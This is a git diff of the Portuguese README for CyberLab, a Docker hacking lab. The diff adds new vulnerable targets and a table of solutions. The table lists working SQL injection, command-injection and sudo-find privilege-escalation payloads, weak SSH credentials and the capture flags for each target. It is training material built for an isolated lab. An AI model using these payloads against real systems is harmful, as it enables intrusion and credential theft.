@@ -16,6 +16,8 @@ peso no PC** e sem risco de escapar do lab. Multiplataforma: **Linux**,
 |---|---|
 | `cyberlab-attacker` | Atacante (debian-slim + nmap, hydra, scapy, paramiko, impacket, vim, nano, neofetch, htop…) com suas ferramentas em `/root/tools` |
 | `cyberlab-webvuln-N` | Web app vulnerável (SQLi, XSS, LFI, command injection) |
+| `cyberlab-shopvuln-N` | Loja web realista — SQLi, IDOR, SSRF, XSS stored, RCE (médio) |
+| `cyberlab-privesc-N` | Linux com escalação de privilégio (sudo/cron/SUID) — médio |
 | `cyberlab-sshweak-N` | SSH com senhas fracas (brute-force) |
 | `cyberlab-ftpanon-N` | FTP anônimo com arquivos sensíveis |
 | `cyberlab-net` | Rede *internal* (`172.30.0.0/24`) — sem rota para a internet |
@@ -173,9 +175,14 @@ Instalar libs novas no atacante: ligue a internet (tecla `i`) e rode
 |---|---|---|
 | webvuln | `/search?q=' UNION SELECT flag,2 FROM secrets-- -` | `CYBERLAB{sql1_un10n_xtr4ct}` |
 | webvuln | `/ping?host=127.0.0.1;cat /flag.txt` | `CYBERLAB{w3b_pwn3d_c0ngr4tz}` |
-| webvuln | `/login` com `' OR '1'='1` | bypass de auth |
+| shopvuln | `/tools/ping?host=127.0.0.1\|cat /flag.txt` | `CYBERLAB{sh0p_rce_m3dium}` |
+| privesc | `sudo find . -exec /bin/sh -p \; -quit` depois `/root/flag.txt` | `CYBERLAB{pr1v3sc_l1nux}` |
 | sshweak | hydra contra usuários fracos (`root:toor`, `admin:admin`, `user:password`, `backup:backup123`) | `CYBERLAB{ssh_brut3_f0rc3_w1n}` em `/root/flag.txt` |
-| ftpanon | login anônimo, baixar `pub/flag.txt` | `CYBERLAB{ftp_4n0nym0us_l00t}` |
+| `ftpanon` | login anônimo, baixar `pub/flag.txt` | `CYBERLAB{ftp_4n0nym0us_l00t}` |
+| shopvuln | `/search?q=' UNION SELECT username,password FROM users-- -` → login → RCE em `/tools/ping` | `CYBERLAB{sh0p_rce_m3dium}` |
+| privesc | SSH como `dev:dev123` → `sudo -l`/cron/SUID → root | `CYBERLAB{pr1v3sc_l1nux}` |
+
+**Writeups completos de todos os labs:** consulte a pasta [`docs/`](docs/).
 
 ## Segurança
 
@@ -221,6 +228,8 @@ CyberLab.py/
 │   ├── app.py                # TUI (Textual)
 │   ├── docker/               # Dockerfiles do atacante e dos alvos (package data)
 │   └── examples/             # ferramentas de exemplo
+├── docs/                     # writeups de hacking de todos os labs
+├── site/                     # landing page de divulgação (HTML/CSS)
 └── tests/                    # testes de fumaça (manager, TUI, terminal, custom)
 ```
 
